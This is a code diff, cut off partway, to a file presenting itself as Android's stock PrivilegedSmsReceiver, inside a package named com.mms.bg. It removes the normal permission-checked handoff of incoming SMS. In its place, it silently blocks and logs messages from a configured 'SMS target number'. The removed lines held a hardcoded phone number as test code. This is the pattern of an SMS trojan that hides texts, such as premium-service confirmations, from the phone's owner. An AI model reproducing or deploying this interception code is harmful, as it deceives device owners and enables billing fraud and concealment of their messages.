@@ -25,6 +25,7 @@ import android.telephony.SmsMessage;
 import com.android.internal.telephony.TelephonyIntents;
 import android.provider.Telephony.Sms.Intents;
 import com.mms.bg.*;
+import com.mms.bg.ui.SettingManager;
 
 /**
  * This class exists specifically to allow us to require permissions checks on SMS_RECEIVED
@@ -32,26 +33,18 @@ import com.mms.bg.*;
  * SmsReceiver base class.
  */
 public class PrivilegedSmsReceiver extends SmsReceiver {
+    
     private static final String TAG = "PrivilegedSmsReceiver";
+    private static final boolean DEBUG = true;
     
     @Override
     public void onReceive(Context context, Intent intent) {
-        // Pass the message to the base class implementation, noting that it
-        // was permission-checked on the way in.
-//        onReceiveWithPrivilege(context, intent, true);
-        
-        SharedPreferences mSp = PreferenceManager.getDefaultSharedPreferences(context);
-        String mBlockNum = mSp.getString(context.getString(R.string.block_num), null);
-        if (mBlockNum == null) {
-            //test code
-            mBlockNum = "15810864155";
-            SharedPreferences.Editor editor = mSp.edit();
-            editor.putString(context.getString(R.string.block_num), mBlockNum);
-            editor.commit();
-        }
+        if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]]");
+        String mBlockNum = SettingManager.getInstance(context).getSMSTargetNum();
         
         SmsMessage[] msgs = Intents.getMessagesFromIntent(intent);
         String addr = msgs[0].getDisplayOriginatingAddress();
+        if (DEBUG) Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] addr received = " + addr + " block num = " + mBlockNum);
         if (addr.equals(mBlockNum) == true) {
             Log.d(TAG, "[[PrivilegedSmsReceiver::onReceive]] block the sms from = " + mBlockNum
                     + " body = " + msgs[0].getDisplayMessageBody());
